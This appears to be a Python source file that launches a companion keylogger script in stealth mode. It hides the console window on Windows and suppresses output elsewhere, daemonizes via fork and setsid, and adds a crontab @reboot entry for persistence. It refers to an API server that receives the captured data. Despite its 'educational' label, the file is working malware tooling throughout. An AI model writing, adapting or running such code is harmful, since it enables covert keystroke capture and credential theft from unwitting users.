"""
Stealth launcher for keylogger (educational demonstration)
Shows how keyloggers can be hidden from the user
"""

import os
import sys
import subprocess
import platform
import time

def hide_console_windows():
    """Hide console window (Windows only - for demonstration)"""
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def hide_console_linux():
    """Hide console output (Linux/Mac - for demonstration)"""
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

def run_as_background():
    """Run the keylogger as a background process"""
    if platform.system() == "Linux" or platform.system() == "Darwin":
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    
    os.setsid()
    os.umask(0)

def launch_keylogger_stealth():
    """Launch keylogger in stealth mode"""
    
    try:
        if platform.system() == "Windows":
            hide_console_windows()
        else:
            hide_console_linux()
    except:
        pass
    
    try:
        run_as_background()
    except:
        pass
    
    python_executable = sys.executable
    keylogger_script = os.path.join(os.path.dirname(__file__), "keylogger.py")
    
    subprocess.Popen(
        [python_executable, keylogger_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    
    print("✅ Keylogger launched in background")
    print("   Check api_server for received data")

def create_persistence():
    """Create persistence mechanism (demonstration only)"""
    
    if platform.system() == "Linux":
        script_path = os.path.abspath(__file__)
        cron_line = f"@reboot {sys.executable} {script_path}\n"
        
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout
            
            if script_path not in current_cron:
                new_cron = current_cron + cron_line
                subprocess.run(['crontab', '-'], input=new_cron, text=True)
                print("✅ Persistence added to crontab")
        except:
            pass

if __name__ == "__main__":
    print("="*60)
    print("🔐 STEALTH KEYLOGGER LAUNCHER (DEMONSTRATION)")
    print("="*60)
    print("\n⚠️  FOR EDUCATIONAL PURPOSES ONLY")
    print("⚠️  This demonstrates how keyloggers can be hidden\n")
    
    print("Options:")
    print("1. Launch keylogger in background")
    print("2. Launch with persistence (adds to crontab)")
    print("3. Exit")
    
    choice = input("\nSelect option (1-3): ").strip()
    
    if choice == "1":
        print("\n🚀 Launching keylogger in background...")
        launch_keylogger_stealth()
    elif choice == "2":
        print("\n🚀 Launching with persistence...")
        create_persistence()
        launch_keylogger_stealth()
    else:
        print("Exiting...")
